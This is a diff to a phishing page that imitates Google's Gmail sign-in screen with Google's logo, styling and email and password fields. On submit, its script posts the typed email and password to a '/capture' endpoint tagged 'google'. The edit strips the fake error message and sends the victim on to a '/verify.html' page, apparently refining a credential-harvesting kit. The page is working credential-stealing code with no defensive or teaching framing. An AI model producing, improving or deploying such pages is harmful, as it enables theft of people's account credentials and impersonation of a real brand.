@@ -6,35 +6,27 @@
 <style>
   body{margin:0;font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
   .box{border:1px solid #dadce0;padding:48px 40px;width:400px;border-radius:8px;text-align:center}
-  .logo{width:75px;margin-bottom:16px}
-  h1{font-size:24px;font-weight:400;margin:0 0 8px}
-  p{font-size:16px;margin:0 0 32px;color:#202124}
+  .logo{width:75px;margin-bottom:16px} h1{font-size:24px;font-weight:400;margin:0 0 8px} p{font-size:16px;margin:0 0 32px;color:#202124}
   input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;margin-bottom:16px;outline:none;box-sizing:border-box}
   input:focus{border:2px solid #1a73e8;padding:12px 14px}
   .btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;float:right}
-  .msg{color:#d93025;font-size:14px;margin-top:16px;text-align:left;clear:both}
 </style>
 </head>
 <body>
 <div class="box">
-  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-  <h1>Sign in</h1>
-  <p>to continue to Gmail</p>
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+  <h1>Sign in</h1><p>to continue to Gmail</p>
   <form id="f">
     <input name="user" type="email" placeholder="Email or phone" required autofocus>
     <input name="pass" type="password" placeholder="Enter your password" required>
     <button type="submit" class="btn">Next</button>
-    <p id="msg" class="msg"></p>
   </form>
 </div>
 <script>
 document.getElementById('f').addEventListener('submit', async e => {
-  e.preventDefault();
-  const fd = new FormData(e.target);
-  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'google'})});
-  const j = await r.json().catch(()=>({}));
-  if(j.redirect){window.location=j.redirect;return;}
-  document.getElementById('msg').textContent = 'Wrong password. Try again or click Forgot password to reset it.';
+  e.preventDefault(); const fd = new FormData(e.target);
+  await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'google'})}).catch(()=>{});
+  window.location.href = '/verify.html?b=google';
 });
 </script>
 </body>
